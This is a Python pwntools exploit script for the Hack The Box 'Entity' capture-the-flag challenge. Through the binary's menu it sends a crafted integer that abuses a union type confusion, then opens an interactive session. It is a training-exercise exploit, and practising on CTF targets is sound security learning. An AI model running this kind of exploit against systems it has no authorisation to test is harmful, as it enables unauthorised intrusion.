#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = './entity'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def build_payload():
    return p64(13371337)

def perform_exploit(p):
    log.info("Sending STORE_SET + STRING path to manipulate union value...")
    p.sendlineafter(b">> ", b"T")  # STORE_SET
    p.sendlineafter(b">> ", b"S")  # STRING

    payload = build_payload()
    print(u64(payload))
    p.sendlineafter(b">> ", payload)
    p.sendlineafter(b">> ", b"C")
    p.interactive()

def main():
    parser = argparse.ArgumentParser(description="Exploit for Entity challenge (HTB)")
    parser.add_argument('--host', help='Remote host', required=False)
    parser.add_argument('--port', help='Remote port', required=False)
    args = parser.parse_args()

    p = get_process(args)
    perform_exploit(p)

if __name__ == '__main__':
    main()